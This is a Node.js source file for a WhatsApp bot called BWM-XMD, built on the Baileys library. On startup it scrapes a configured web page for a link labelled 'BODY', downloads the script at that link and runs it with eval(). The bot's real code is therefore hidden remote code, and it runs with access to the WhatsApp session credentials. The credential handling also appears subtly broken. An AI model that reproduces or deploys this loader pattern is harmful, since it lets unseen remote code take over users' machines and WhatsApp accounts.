
//  [BWM-XMD QUANTUM EDITION]                                           
//  >> A superposition of elegant code states                           
//  >> Collapsed into optimal execution                                
//  >> Scripted by Sir Ibrahim Adams                                    
//  >> Version: 8.3.5-quantum.7

const axios = require('axios');
const cheerio = require('cheerio');
const adams = require("./config");
const { makeWASocket, makeInMemoryStore } = require('@whiskeysockets/baileys');

// Session persistence
const store = makeInMemoryStore();

async function fetchBODYUrl() {
  try {
    console.log('🌐 Fetching BODY script...');
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);
    const targetUrl = $('a:contains("BODY")').attr('href');

    if (!targetUrl) throw new Error('BODY script not found');
    console.log('🔗 BODY URL:', targetUrl);

    const scriptResponse = await axios.get(targetUrl);
    eval(scriptResponse.data);
    console.log('✅ BODY script executed');
  } catch (error) {
    console.error('❌ fetchBODYUrl() failed:', error.message);
    process.exit(1);
  }
}

async function startBot() {
  await fetchBODYUrl();

  const sock = makeWASocket({
    printQRInTerminal: true,
    logger: console,
    auth: {
      creds: store.readFromFile('./session.json'),
    },
  });

  sock.ev.on('creds.update', () => {
    store.writeToFile('./session.json');
  });

  sock.ev.on('connection.update', (update) => {
    console.log('🔌 Connection Update:', update);
    if (update.qr) console.log('📢 Scan QR:');
    if (update.connection === 'open') console.log('🤖 Bot connected!');
  });

  sock.ev.on('messages.upsert', ({ messages }) => {
    const msg = messages[0];
    console.log('📩 Message received:', msg?.message?.conversation);
    // Add your reply logic here
  });
}

startBot().catch(console.error); 